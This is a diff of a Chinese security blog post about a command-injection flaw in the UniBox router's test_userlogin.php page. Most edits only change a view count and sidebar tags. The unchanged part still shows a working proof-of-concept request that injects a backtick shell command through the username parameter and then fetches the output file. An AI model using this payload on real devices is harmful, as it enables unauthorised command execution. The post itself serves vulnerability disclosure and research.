@@ -7,17 +7,17 @@ asset_dir: assets/unibox路由器-authenticationtest_userlogin.php-命令执行�
 # Unibox路由器 authentication/test\_userlogin.php 命令执行漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/5/3 08:26
-- 7734浏览
+- 7745浏览
 - [0评论](#comment)
 - 10分钟阅读
 
 深入探索
 
-编程语言教程
+授权
 
-Windows安全工具
+数据库
 
-物流软件安全
+JSON处理工具
 
 ---
 
@@ -37,11 +37,11 @@ Wifi-soft UniBox controller 路由器产品中存在一个致命漏洞，`/authe
 
 深入探索
 
-技术文章订阅
+安全
 
-Web安全课程
+在线安全工具
 
-网络安全培训
+SQL
 
 直接看 `/authentication/test_userlogin.php` 的业务实现造成漏洞的关键部分如下
 
@@ -74,14 +74,6 @@ if ($_REQUEST['testuser'] == 1){
 GET /authentication/test_userlogin.php?testuser=1&username=`env>11.txt`%20%23%20 HTTP/1.1
 Host: unibox.mrxn.net
 ```
-
-深入探索
-
-VPN服务
-
-安全研究报告
-
-安全认证考试
 
 访问命令执行结果文件 `/authentication/11.txt`
 
